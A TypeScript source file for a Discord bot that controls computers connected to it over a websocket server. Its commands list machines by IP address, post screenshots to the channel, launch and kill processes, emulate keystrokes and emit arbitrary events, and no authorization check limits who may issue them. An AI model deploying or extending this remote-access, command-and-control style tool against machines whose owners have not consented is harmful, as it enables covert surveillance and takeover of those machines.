import { ActivityType, Client, EmbedBuilder, IntentsBitField } from 'discord.js';
import { Errors } from './enums/errors';
import ClientManager from './utils/ClientManager';
import { getDiscordUserHandler } from './utils/DiscordUserManager';
import Methods from './utils/Methods';
import WebsocketManager from './utils/WebsocketManager';

const wss = new WebsocketManager('0.0.0.0', 8080, true);

const bot = new Client({
    intents: [
        IntentsBitField.Flags.Guilds,
        IntentsBitField.Flags.GuildMessages,
        IntentsBitField.Flags.MessageContent,
        IntentsBitField.Flags.GuildMembers
    ]
});

bot.on('ready', () => {
    console.log(`${bot.user?.tag} is ready`);
    Methods.initClient(bot);

    setInterval(() => {
        bot.user?.setActivity({
            name: `with ${wss.clients.length} computers`,
            type: ActivityType.Playing
        })
    }, 5000);
});

bot.on('messageCreate', async (message) => {
    if(message.content[0] !== Methods.getConfig("BOT_PREFIX")) return;

    const user = getDiscordUserHandler(message.author);
    const managingClient: ClientManager = user.getVariable('managingClient');

    const [command, ...args] = message.content
        .trim()
        .substring(Methods.getConfig("BOT_PREFIX")?.length || 0)
        .split(/\s+/);

    switch(command) {
        case 'ping':
            message.reply("I'm online :)");
            break;
        case 'clients':
            const embed = new EmbedBuilder();
            embed.setColor(0xFF0000);
            embed.setTitle(`Connected clients (${wss.clients.length})`);     
            embed.setDescription(await Promise.all(wss.clients.map(async(client, index) => {
                const isManaging = user.getVariable('managingClient') === client;
                return `**#${(index + 1)}.** ${await client.getName()} - ${client.remoteAddress}${isManaging ? ' **(Managing)**' : ''}`
            })).then(res => res.join('\n')));
            message.channel.send({ embeds: [embed] });
            break;
        case 'manage':
            if(!args[0]) {
                Methods.sendSyntax(message, command, 'ip / off');
            } else {
                const target = args[0];
                if(target !== 'off') {
                    const client = wss.clients.find(f => f.remoteAddress === args[0]);
                    if(client) {
                        user.setVariable('managingClient', client);
                        message.reply(`You are now managing ${await client.getName()} (${client.remoteAddress})`);
                    } else {
                        Methods.sendError(message, 'Client not found');
                    }
                } else {
                    message.reply('You are no longer managing a client');
                }
            }
            break;
        case 'ss':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            const screenshot = await managingClient.takeScreenshot();
            if(screenshot) {
                message.channel.send({ files: [screenshot] });
            } else {
                Methods.sendError(message, 'Failed to take screenshot');
            }
            break;
        case 'setvolume':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            const volume = parseInt(args[0]);
            if(!isNaN(volume)) {
                managingClient.setVolume(volume);
                message.reply(`Volume set to **${volume}**`);
            } else {
                Methods.sendSyntax(message, command, 'volume');
            }
            break;
        case 'getvolume':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            message.reply(`Volume is **${await managingClient.getVolume()}**`);
            break;
        case 'open':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            if(args.length) {
                const result = await managingClient.openProcess(...args);
                message.reply(`Started **${args[0]}** with PID **${result}**`);
            } else {
                Methods.sendSyntax(message, command, 'commands, ...args');
            }
            break;
        case 'kill':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            const pid = parseInt(args[0]);
            if(!isNaN(pid)) {
                managingClient.killProcess(pid);
                message.reply(`Killing process id **${pid}**`);
            } else {
                Methods.sendSyntax(message, command, 'pid');
            }
            break;
        case 'emulatekeycombination':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            const combination = args.slice(0).join(" ");
            if(combination.length) {
                managingClient.emulateKeyCombination(combination);
                message.reply(`Emulating key combination **${combination}**`);
            } else {
                Methods.sendSyntax(message, command, 'combination');
            }
            break;
        case 'emit':
            if(!managingClient) return Methods.sendError(message, Errors.MustManageClient);
            if(args.length) {
                const eventName = args[0];
                const eventArgs = args.slice(1);
                managingClient.call(eventName, ...eventArgs);
            } else {
                Methods.sendSyntax(message, command, 'eventName', '...eventArgs');
            }
            break;
    }
});

bot.login(Methods.getConfig("BOT_TOKEN"));